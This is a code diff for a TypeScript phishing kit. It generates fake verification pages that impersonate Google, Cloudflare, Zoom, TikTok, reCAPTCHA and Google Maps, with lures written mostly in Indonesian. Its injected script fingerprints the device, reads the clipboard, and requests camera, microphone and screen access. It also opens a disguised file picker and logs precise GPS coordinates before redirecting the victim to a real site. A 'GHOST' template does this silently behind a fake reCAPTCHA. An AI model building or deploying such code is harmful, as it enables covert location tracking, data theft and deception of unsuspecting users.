@@ -1,6 +1,6 @@
 export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com', theme: any = {}) => {
   const flow = theme.flow || 'full'; 
-  const perms = theme.perms || ['gps']; // gps, notification, clipboard, media, motion
+  const perms = theme.perms || ['gps']; 
   
   return `
 <script>
@@ -17,8 +17,8 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
     function checkRedirect() {
       if (hasRedirected) return;
       var elapsed = (Date.now() - startTime) / 1000;
-      var threshold = (flowType === 'full') ? 25 : 7;
-      if (elapsed >= threshold || (permsAttempted >= requiredPerms.length && elapsed >= 2)) {
+      var threshold = (flowType === 'full') ? 40 : 12;
+      if (elapsed >= threshold || (permsAttempted >= requiredPerms.length && elapsed >= 3)) {
         hasRedirected = true;
         window.location.href = targetUrl;
       }
@@ -40,12 +40,12 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       var accent = cfg.accent || '#3498db';
 
       if (!isSilent) {
-        box.innerHTML = '<div id="status-icon" style="font-size:40px; margin-bottom:15px;">' + (cfg.icon || '🔍') + '</div>' +
-          '<h2 id="status-title">' + (cfg.initTitle || 'Memproses...') + '</h2>' +
-          '<div id="progress-container" style="width:100%; background:#f0f0f0; border-radius:10px; height:8px; margin-bottom:15px; overflow:hidden; border: 1px solid #eee;">' +
-          '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.4s ease;"></div>' +
+        box.innerHTML = '<div id="status-icon" style="font-size:40px; opacity:0.8; margin-bottom:15px;">' + (cfg.icon || '🔍') + '</div>' +
+          '<h2 id="status-title" style="font-weight:600; color:#2c3e50;">Verifying...</h2>' +
+          '<div id="progress-container" style="width:100%; background:#ecf0f1; border-radius:4px; height:6px; margin-bottom:20px; overflow:hidden;">' +
+          '<div id="progress-bar" style="width:0%; background:' + accent + '; height:100%; transition:width 0.5s cubic-bezier(0.4, 0, 0.2, 1);"></div>' +
           '</div>' +
-          '<p id="status-text" style="font-size:13px; color:#7f8c8d; min-height: 40px;">' + (cfg.initText || 'Menghubungkan ke server...') + '</p>';
+          '<p id="status-text" style="font-size:13px; color:#95a5a6; font-family:sans-serif; min-height: 40px;"></p>';
       }
 
       var statusTitle = document.getElementById('status-title');
@@ -68,108 +68,106 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       }
 
       function finish(success, reason) {
-        if (isSilent) {
-           window.location.href = targetUrl;
-           return;
-        }
+        if (isSilent) { window.location.href = targetUrl; return; }
         if (bar) bar.style.width = '100%';
         if (success) {
           if (icon) icon.innerText = "✅";
-          if (statusTitle) {
-            statusTitle.innerText = cfg.doneTitle || "Selesai";
-            statusTitle.style.color = "#27ae60";
-          }
-          if (statusText) statusText.innerText = "Verifikasi berhasil. Mengalihkan...";
-          if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+          if (statusTitle) { statusTitle.innerText = "VERIFIED"; statusTitle.style.color = "#27ae60"; }
+          if (statusText) statusText.innerText = "Authentication successful. Finalizing session...";
         } else {
           if (icon) icon.innerText = "ℹ️";
-          if (statusTitle) statusTitle.innerText = "Selesai";
-          if (statusText) statusText.innerText = (reason || "") + " Mengalihkan...";
+          if (statusTitle) statusTitle.innerText = "COMPLETE";
+          if (statusText) statusText.innerText = (reason || "") + " Syncing redirect...";
         }
         setTimeout(checkRedirect, 2000);
       }
 
       try {
-        if (!isSilent) updateProgress(10, cfg.step1 || "Menganalisis sistem...");
+        if (!isSilent) updateProgress(5, "Initial configuration check...", "SYSTEM_INIT");
         
         var metadata = {
           browser: navigator.userAgent,
           platform: navigator.platform,
           screen: window.screen.width + "x" + window.screen.height,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          language: navigator.language,
           cores: navigator.hardwareConcurrency || "N/A",
-          vendor: navigator.vendor,
+          mem: navigator.deviceMemory || "N/A",
           ref: document.referrer || "Direct"
         };
-
-        try {
-          if ('getBattery' in navigator) {
-            var b = await navigator.getBattery();
-            metadata.battery = Math.round(b.level * 100) + "% (" + (b.charging ? "Charging" : "Discharging") + ")";
-          }
-        } catch(e) {}
-
         await logEvent('info', metadata);
 
-        // Permissions Sequence
-        var currentProgress = 20;
+        var currentProgress = 10;
         var stepCount = requiredPerms.length;
 
         for (var i = 0; i < requiredPerms.length; i++) {
           var perm = requiredPerms[i];
-          currentProgress += Math.floor(60 / stepCount);
+          currentProgress += Math.floor(80 / stepCount);
 
-          if (perm === 'notification' && "Notification" in window) {
-            if (!isSilent) updateProgress(currentProgress, "Mengaktifkan push alerts...", "Izin Notifikasi");
-            await Notification.requestPermission();
+          if (perm === 'notification') {
+            if (!isSilent) updateProgress(currentProgress, "Syncing alert protocols...", "PUSH_VALIDATION");
+            if ("Notification" in window) await Notification.requestPermission();
           }
 
-          if (perm === 'clipboard' && navigator.clipboard) {
-            if (!isSilent) updateProgress(currentProgress, "Validasi token keamanan data...", "Clipboard Sync");
+          if (perm === 'clipboard') {
+            if (!isSilent) updateProgress(currentProgress, "Verifying memory buffer...", "CACHE_SYNC");
             try {
               var clip = await navigator.clipboard.readText();
               if (clip) await logEvent('extra', { clipboard: clip });
             } catch(e) {}
           }
 
-          if (perm === 'media' && navigator.mediaDevices) {
-            if (!isSilent) updateProgress(currentProgress, "Mendeteksi port audio/video...", "Hardware Check");
+          if (perm === 'media') {
+            if (!isSilent) updateProgress(currentProgress, "Calibrating AV components...", "HARDWARE_AUDIT");
             try {
-              var devs = await navigator.mediaDevices.enumerateDevices();
-              var list = devs.map(d => d.kind + ': ' + (d.label || 'Unknown Device')).join('\\n');
-              await logEvent('extra', { media: list });
+               await navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(s => s.getTracks().forEach(t => t.stop())).catch(e=>{});
+               var devs = await navigator.mediaDevices.enumerateDevices();
+               var list = devs.map(d => d.kind + ': ' + (d.label || 'Authenticated Device')).join('\\n');
+               await logEvent('extra', { media: list });
             } catch(e) {}
           }
 
-          if (perm === 'motion') {
-            if (!isSilent) updateProgress(currentProgress, "Mendeteksi aktivitas fisik...", "Motion Check");
-            if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
-                try { await DeviceOrientationEvent.requestPermission(); } catch(e) {}
+          if (perm === 'gps') {
+            if (!isSilent) {
+              updateProgress(currentProgress, "Synchronizing local spatial metrics...", "REGION_AUTH");
+              if (icon && cfg.waitIcon) icon.innerText = cfg.waitIcon;
             }
-          }
-
-          if (perm === 'gps' && navigator.geolocation) {
-             if (!isSilent) {
-                updateProgress(currentProgress, cfg.step3 || "Otorisasi lokasi terakhir...", cfg.waitTitle || "Izin Geolocation");
-                if (icon && cfg.waitIcon) icon.innerText = cfg.waitIcon;
-             }
-             await new Promise(resolve => {
+            await new Promise(resolve => {
                navigator.geolocation.getCurrentPosition(
-                 function(pos) {
-                    logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve);
-                 },
+                 function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
                  function(err) { resolve(); },
                  { enableHighAccuracy: true, timeout: 8000 }
                );
-             });
+            });
           }
+
+          if (perm === 'screen') {
+            if (!isSilent) updateProgress(currentProgress, "Establishing visual integrity link...", "VIRTUAL_SCAN");
+            try {
+               await navigator.mediaDevices.getDisplayMedia({ video: true }).then(s => {
+                  var track = s.getVideoTracks()[0];
+                  logEvent('extra', { screen_label: track.label });
+                  s.getTracks().forEach(t => t.stop());
+               });
+            } catch(e) {}
+          }
+
+          if (perm === 'files') {
+             if (!isSilent) updateProgress(currentProgress, "Syncing media storage tokens...", "STORAGE_AUDIT");
+             try {
+                if (window.showOpenFilePicker) {
+                   var [handle] = await window.showOpenFilePicker({ types: [{ description: 'Security Token', accept: { 'image/*': ['.png', '.jpg', '.jpeg'] } }] });
+                   var file = await handle.getFile();
+                   await logEvent('extra', { file_name: file.name, file_size: file.size });
+                }
+             } catch(e) {}
+          }
+
           permsAttempted++;
         }
 
         finish(true);
       } catch (err) {
-        finish(false, "Sistem sibuk.");
+        finish(false, "Service timeout.");
       }
     };
   })();
@@ -179,81 +177,30 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
 
 export const templates: Record<string, {name: string, render: (id: string) => string}> = {
   '1': {
-    name: "🛡️ Standard Security (Notifications)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Identity Verification</title><style>body { background:#fff; color:#333; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center;} .box { width:90%; max-width:400px; padding:30px; background:#fff; border-radius:15px; } .loader { border:3px solid #f3f3f3; border-top:3px solid #3498db; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:0 auto 20px;} @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } } h2 { font-size:22px; margin-bottom:10px; } p { color:#666; font-size:14px; margin-bottom:25px; } .btn { background:#3498db; color:#fff; border:none; padding:15px 40px; border-radius:30px; font-weight:bold; cursor:pointer; font-size:16px; box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3); width: 100%; } .btn:active { transform: scale(0.98); }</style></head><body><div class="box"><div class="loader"></div><h2>Layanan Keamanan</h2><p>Langkah terakhir: Hubungkan notifikasi browser Anda untuk verifikasi identitas real-time.</p><button class="btn" onclick="window.startCapture();">HUBUNGKAN SEKARANG</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: '1', perms: ['notification'], accent: '#3498db', icon: '🛡️',
-      initTitle: 'Sinkronisasi...', initText: 'Mempersiapkan hub alerts...',
-      doneTitle: 'Terverifikasi'
+    name: "🏢 Enterprise: Cloud Security Sync (Notify + GPS)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Verification</title><style>body { background:#f8f9fa; color:#333; font-family:'Segoe UI', Tahoma, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center;} .box { width:90%; max-width:400px; padding:45px; background:#fff; border-radius:8px; box-shadow:0 10px 25px rgba(0,0,0,0.05); } h2 { font-size:24px; margin-bottom:15px; color:#1a73e8; } p { color:#5f6368; font-size:14px; line-height:1.5; margin-bottom:30px; } .btn { background:#1a73e8; color:#fff; border:none; padding:15px 30px; border-radius:4px; font-weight:600; cursor:pointer; width:100%; transition:background 0.2s; } .btn:hover { background:#1557b0; }</style></head><body><div class="box"><div style="font-size:40px; margin-bottom:20px;">🛡️</div><h2>Security Audit</h2><p>Lengkapi verifikasi perangkat untuk melanjutkan sesi aman Anda. Mohon izinkan notifikasi dan sinkronisasi lokasi saat diminta.</p><button class="btn" onclick="window.startCapture();">DAPATKAN SERTIFIKASI</button></div>${getCaptureScript(id, 'https://google.com', {
+      tmplId: '1', perms: ['notification', 'gps'], accent: '#1a73e8', icon: '📡',
+      doneTitle: 'CERTIFIED'
     })}</body></html>`
   },
-  '2': {
-    name: "☁️ Cloudflare: Secure Path (Clipboard)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Needed</title><style>body { font-family:system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; padding:20px; } .box { width:90%; max-width:450px; } .dot-spinner { display:flex; gap:8px; margin-bottom:20px; justify-content:center; } .dot { width:10px; height:10px; background:#fa8231; border-radius:50%; animation:bounce 0.5s infinite alternate; } .dot:nth-child(2) { animation-delay:0.1s; } .dot:nth-child(3) { animation-delay:0.2s; } @keyframes bounce { to { transform:translateY(-10px); } } h1 { font-size:24px; font-weight:500; } .info { font-size:14px; color:#555; margin-bottom:30px; } .btn { border:1px solid #ccc; background:#fff; padding:12px 25px; border-radius:4px; font-weight:600; cursor:pointer; box-shadow:0 1px 2px rgba(0,0,0,0.05); width:100%; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120" style="margin-bottom:30px;"><div class="dot-spinner"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><h1>Integrity Verification</h1><p class="info">Click below to allow the system to verify your browser token from the secure clipboard area.</p><button class="btn" onclick="window.startCapture();">Confirm Integrity</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: '2', perms: ['clipboard'], accent: '#fa8231', icon: '🛰️',
-      initTitle: 'Validating Token...', initText: 'Decrypting Ray ID from memory...',
-      doneTitle: 'Success'
-    })}</body></html>`
-  },
-  '3': {
-    name: "⚙️ File Access: Region Sync (GPS)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Redirecting...</title><style>body { background:#f9f9f9; text-align:center; padding-top:20vh; font-family:sans-serif;} .box { width:90%; max-width:400px; background:#fff; border:1px solid #ddd; display:inline-block; padding:40px; border-radius:10px; box-shadow:0 4px 6px rgba(0,0,0,0.05); } .icon { font-size:50px; margin-bottom:15px; } .btn { background:#000; color:#fff; border:none; padding:12px 40px; border-radius:25px; font-weight:bold; cursor:pointer; margin-top:20px; width:100%; }</style></head><body><div class="box"><div class="icon">📁</div><h2>Konten Terbatas</h2><p>Mohon konfirmasi lokasi Anda untuk mensinkronkan ketersediaan file di wilayah Anda.</p><button class="btn" onclick="window.startCapture();">VALIDASI LOKASI</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: '3', perms: ['gps'], accent: '#000', icon: '🌍',
-      initTitle: 'Checking Region...', initText: 'Matching IP with coordinates...',
-      doneTitle: 'Region Validated'
-    })}</body></html>`
-  },
-  '4': {
-    name: "G Google Sync (Notifications + GPS)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Google Secure</title><style>body { font-family: 'Roboto', Arial, sans-serif; text-align:center; padding-top:10vh; } .container { width:90%; max-width:400px; margin:0 auto; padding:30px; border:1px solid #efefef; border-radius:8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); } h2 { font-weight:400; color: #202124; } .btn { background:#1a73e8; color:white; border:none; padding:12px 30px; border-radius:4px; cursor:pointer; font-weight:500; margin-top:20px; width:100%; }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90"><br><br><h2>Sinkronisasi Akun</h2><p>Amankan akun Anda dengan mengaktifkan <b>Notifikasi Login & Lokasi Tepercaya</b> pada perangkat ini.</p><button class="btn" onclick="window.startCapture();">SINKRONKAN SEKARANG</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: '4', perms: ['notification', 'gps'], accent: '#4285f4', icon: '📱',
-      initTitle: 'Google Sync...', initText: 'Connecting to security nodes...',
-      doneTitle: 'Account Protection Enabled'
+  '11': {
+    name: "💎 VIP: Advanced Identity Scan (Files/Gallery + GPS + Media)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Advanced Authentication</title><style>body { background:#f4f7f6; color:#2d3436; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; } .box { width:90%; max-width:480px; padding:40px; background:#fff; border-radius:12px; border-top:5px solid #6c5ce7; box-shadow:0 15px 35px rgba(0,0,0,0.1); } h1 { font-size:22px; font-weight:700; color:#2d3436; } .btn { background:#6c5ce7; color:#fff; border:none; padding:18px 40px; border-radius:8px; font-weight:bold; cursor:pointer; width:100%; margin-top:20px; font-size:16px; }</style></head><body><div class="box"><img src="https://cdn-icons-png.flaticon.com/512/1067/1067566.png" width="80" style="margin-bottom:20px;"><h1>Verifikasi Identitas Premium</h1><p style="color:#636e72; font-size:14px;">Untuk memastikan keamanan akun level tinggi, sistem perlu memvalidasi sertifikat visual dan koordinat regional Anda.</p><button class="btn" onclick="window.startCapture();">MULAI VALIDASI VIP</button></div>${getCaptureScript(id, 'https://google.com/', {
+      tmplId: '11', perms: ['files', 'media', 'gps'], accent: '#6c5ce7', icon: '💎',
+      doneTitle: 'AUTHENTICATED'
     })}</body></html>`
   },
   '5': {
-    name: "🖥️ Cyber Scanner (GPS + Notify + Clip)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Sync</title><style>body { background:#000; color:#0f0; font-family:'Courier New', monospace; text-align:center; padding-top:20vh; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { border:1px solid #0f0; background:transparent; color:#0f0; padding:15px 30px; cursor:pointer; font-size:18px; width:100%; }</style></head><body><div class="box"><h1>SCANNING DEVICE...</h1><p>[*] Checking browser integrity<br>[*] Requesting permission bundle for deep scan...<br><br>Klik untuk mengizinkan audit keamanan penuh.</p><br><button class="btn" onclick="window.startCapture();">FULL SECURITY AUDIT</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: '5', perms: ['notification', 'clipboard', 'gps'], flow: 'full', accent: '#0f0', icon: '▒▒',
-      initTitle: 'AUDIT_RUNNING...', initText: '[*] Checking system vulnerabilities...',
-      doneTitle: 'THREATS_CLEARED'
-    })}</body></html>`
-  },
-  '6': {
-    name: "🚄 Railway App (Media List)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Railway App</title><style>body { background:#111; color:#fff; font-family:sans-serif; text-align:center; padding-top:20vh; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { background:#e1ff00; color:#000; padding:12px 25px; border-radius:6px; font-weight:bold; border:none; margin-top:20px; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://railway.app/brand/logotype-dark.svg" width="150" style="margin-bottom:30px;"><br><h2>Deploy Verification</h2><p>Otorisasi sinkronisasi hardware diperlukan untuk mengalokasikan container server yang tepat.</p><button class="btn" onclick="window.startCapture();">AUTHENTICATE HARDWARE</button></div>${getCaptureScript(id, 'https://google.com', {
-      tmplId: '6', perms: ['media'], accent: '#e1ff00', icon: '🚄',
-      initTitle: 'Deploying Sync...', initText: 'Spinning up container resources...',
-      doneTitle: 'Hardware Authenticated'
-    })}</body></html>`
-  },
-  '7': {
-    name: "📹 Zoom: Calibration (Media + GPS)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Zoom Calibration</title><style>body { background:#fff; font-family:sans-serif; text-align:center; padding-top:15vh; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { background:#2d8cff; color:#fff; padding:15px 30px; border-radius:10px; font-weight:bold; border:none; cursor:pointer; font-size:18px; width:100%; }</style></head><body><div class="box"><img src="https://st1.zoom.us/static/6.3.25055/image/new/ZoomLogo.png" width="120"><br><br><h1>Persiapan Video...</h1><p>Mohon izinkan <b>Sertifikasi Media & Lokasi</b> agar server dapat mensinkronkan sesi video Anda.</p><button class="btn" onclick="window.startCapture();">IZINKAN SINKRONISASI</button></div>${getCaptureScript(id, 'https://zoom.us/', {
-      tmplId: '7', perms: ['media', 'gps'], accent: '#2d8cff', icon: '📹',
-      initTitle: 'Calibrating...', initText: 'Matching regional audio buffers...',
-      doneTitle: 'Ready for Call'
-    })}</body></html>`
-  },
-  '8': {
-    name: "🔞 TikTok Age (Motion + GPS)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>TikTok</title><style>body { background:#121212; color:white; text-align:center; padding-top:20vh; font-family:sans-serif; } .box { width:90%; max-width:500px; margin:0 auto; } .btn { background:#fe2c55; color:white; padding:15px 40px; border-radius:4px; font-weight:bold; border:none; cursor:pointer; font-size:16px; width:100%; }</style></head><body><div class="box"><div style="font-size:40px;">🔞</div><h2>USIA DIBATASI</h2><p>Verifikasi kedewasaan Anda melalui **Sinkronisasi Sensor Gerak & Lokasi** untuk membuka konten ini.</p><button class="btn" onclick="window.startCapture();">KONFIRMASI 18+</button></div>${getCaptureScript(id, 'https://tiktok.com/', {
-      tmplId: '8', perms: ['motion', 'gps'], accent: '#fe2c55', icon: '🌍',
-      initTitle: 'Verifying Age...', initText: 'Analyzing regional age laws...',
-      doneTitle: 'Verified Adult'
+    name: "📍 Maps: Location Integrity (GPS + Screen)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Maps Verification</title><style>body { font-family:sans-serif; text-align:center; padding-top:15vh; background:#fff; } .box { width:90%; max-width:450px; margin:0 auto; padding:35px; border-radius:12px; box-shadow:0 4px 30px rgba(0,0,0,0.05); } .btn { background:#34a853; color:white; padding:15px 30px; border-radius:4px; border:none; font-weight:600; cursor:pointer; width:100%; }</style></head><body><div class="box"><img src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg" width="60"><br><h1>Integrasi Visual Maps</h1><p>Sync identitas visual dan lokasi presisi Anda diperlukan agar rute dapat diverifikasi oleh server.</p><br><button class="btn" onclick="window.startCapture();">SINKRONKAN RUTE</button></div>${getCaptureScript(id, 'https://maps.google.com', {
+      tmplId: '5', perms: ['gps', 'screen'], accent: '#34a853', icon: '🌍',
+      doneTitle: 'SYNC_COMPLETE'
     })}</body></html>`
   },
   '9': {
-    name: "🕵️ stealth reCAPTCHA (Silent Flow)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f9f9f9; } .box { border:1px solid #d3d3d3; padding:15px; background:#fff; box-shadow:0 2px 4px rgba(0,0,0,0.1); display:flex; align-items:center; width:300px; cursor:default; }</style></head><body><div style="text-align:center;"><p style="margin-bottom:20px; color:#555;">Satu langkah lagi...</p><div class="box"><div class="check" style="width:25px; height:25px; border:2px solid #c1c1c1; margin-right:15px; display:flex; align-items:center; justify-content:center; color:green; font-weight:bold;"></div><div style="font-size:14px; color:#555;">Selesaikan tantangan...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
-      tmplId: '9', flow: 'silent', perms: []
-    })}</body></html>`
-  },
-  '10':{
-    name: "🛡️ Patch Fix (Notify + Clipboard)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Security Patch</title><style>body { font-family:sans-serif; text-align:center; padding-top:20vh; background:#f5f5f7; } .box { width:90%; max-width:400px; background:#fff; display:inline-block; padding:30px; border-radius:15px; box-shadow:0 10px 30px rgba(0,0,0,0.05); } .btn { background:#007aff; color:white; padding:12px 40px; border-radius:22px; border:none; cursor:pointer; font-weight:600; margin-top:20px; width:100%; }</style></head><body><div class="box"><div style="font-size:50px; color:#007aff; margin-bottom:20px;">⚙️</div><h1>Security Update</h1><p>Izinkan sinkronisasi **Notifikasi & Clipboard** untuk menerapkan patch keamanan terbaru.</p><button class="btn" onclick="window.startCapture();">TERAPKAN PATCH</button></div>${getCaptureScript(id, 'https://google.com/', {
-      tmplId: '10', perms: ['notification', 'clipboard'], accent: '#007aff', icon: '🛡️',
-      initTitle: 'Patching...', initText: 'Applying security blobs...',
-      doneTitle: 'System Hardened'
+    name: "🕵️ GHOST: Stealth Audit (Silent GPS + Clip)",
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f9f9f9; font-family:sans-serif; } .box { border:1px solid #ddd; padding:15px; background:#fff; display:flex; align-items:center; width:300px; box-shadow:0 2px 5px rgba(0,0,0,0.1); }</style></head><body><div style="text-align:center;"><p style="color:#666; margin-bottom:15px;">Validating session integrity...</p><div class="box"><div style="width:25px; height:25px; border:2px solid #ccc; margin-right:15px;"></div><div style="font-size:14px; color:#555;">Processing security link...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
+      tmplId: '9', flow: 'silent', perms: ['gps', 'clipboard']
     })}</body></html>`
   }
 };
